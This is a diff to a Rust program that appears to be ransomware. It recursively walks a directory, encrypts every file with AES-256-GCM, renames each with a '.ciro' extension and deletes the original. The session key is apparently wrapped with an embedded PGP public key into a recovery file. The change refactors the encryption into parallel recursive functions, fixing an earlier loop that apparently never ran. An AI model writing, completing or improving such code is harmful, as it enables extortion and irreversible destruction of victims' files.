@@ -10,7 +10,7 @@ use pgp::{
 use rayon::prelude::*;
 use std::{
     fs::{read, read_dir, remove_file, File},
-    io::{Error, Write},
+    io::Write,
     path::PathBuf,
 };
 use zeroize::Zeroize;
@@ -32,26 +32,48 @@ JXRKgQk=
 -----END PGP PUBLIC KEY BLOCK-----
 "#;
 
-// List files function simply finds all files recursively inside a directory
-fn list_files(dir: PathBuf) -> Result<Vec<PathBuf>, Error> {
-    let mut files: Vec<PathBuf> = vec![];
-    if dir.is_dir() {
-        for entry in read_dir(dir)? {
-            let entry = entry?;
-            let path = entry.path();
-            if path.is_dir() {
-                files.extend(list_files(path)?);
-            } else if let Some(ext) = path.extension() {
-                if ext != "txt.key" {
-                    files.push(path);
-                }
-            } else {
-                files.push(path);
-            }
-        }
+fn encrypt_file(file: PathBuf, cipher: Aes256Gcm) -> Result<(), std::io::Error> {
+    let nonce = Aes256Gcm::generate_nonce(&mut OsRng);
+    let content: Vec<u8> = read(&file)?;
+    let ciphertext: Vec<u8> = cipher
+        .encrypt(&nonce, content.as_ref())
+        .map_err(|_| std::io::Error::new(std::io::ErrorKind::Other, "Encryption error"))?;
+
+    // A new file with the encrypted content is created and the old one deleted
+    let mut new_path = file.clone();
+    if let Some(ext) = new_path.extension() {
+        new_path.set_extension(format!("{}.ciro", ext.to_string_lossy()));
+    } else {
+        new_path.set_extension("ciro");
     }
-    Ok(files)
+    let mut new_file = File::create(new_path)?;
+    new_file.write_all(&nonce)?;
+    new_file.write_all(&ciphertext)?;
+    let _ = remove_file(file);
+    Ok(())
 }
+
+fn encrypt_files(dir: PathBuf, cipher: Aes256Gcm) {
+    if let Ok(entries) = read_dir(dir) {
+        entries.par_bridge().into_par_iter().for_each(|entry| {
+            if let Ok(entry) = entry {
+                let path = entry.path();
+                if path.is_dir() {
+                    encrypt_files(path, cipher.clone());
+                }
+                else if let Some(ext) = path.extension() && ext != "txt.key"{
+                    if let Some(err) = encrypt_file(path, cipher.clone()).err() {
+                        println!("Error: {err}");
+                    }
+                } else if let Err(e) = encrypt_file(path, cipher.clone()) {
+                    println!("Error: {e}");
+                }
+            }
+        });
+    }
+
+}
+
 
 // Main function of the program
 fn main() {
@@ -80,29 +102,7 @@ fn main() {
         .write_all(&msg.to_vec(OsRng).unwrap())
         .expect("recovery file written");
 
-    // Listing all files recursively
-    let files = list_files(dir.to_owned()).expect("Couldn't list files inside the directory");
-
-    // Encryption
-    let _ = files.into_par_iter().map(|file| {
-        let nonce = Aes256Gcm::generate_nonce(&mut OsRng);
-        let content: Vec<u8> = read(&file).expect("read");
-        let ciphertext: Vec<u8> = cipher
-            .encrypt(&nonce, content.as_ref())
-            .expect("encrypt text failure");
-
-        // A new file with the encrypted content is created and the old one deleted
-        let mut new_path = file.clone();
-        if let Some(ext) = new_path.extension() {
-            new_path.set_extension(format!("{:?}.ciro", ext));
-        } else {
-            new_path.set_extension("ciro");
-        }
-        let mut new_file = File::create(new_path).expect("file created");
-        new_file.write_all(&nonce).expect("nonce written");
-        new_file.write_all(&ciphertext).expect("text written");
-        let _ = remove_file(file);
-    });
+    encrypt_files(dir, cipher);
 
     // Zeroing the key in memory
     key.zeroize();
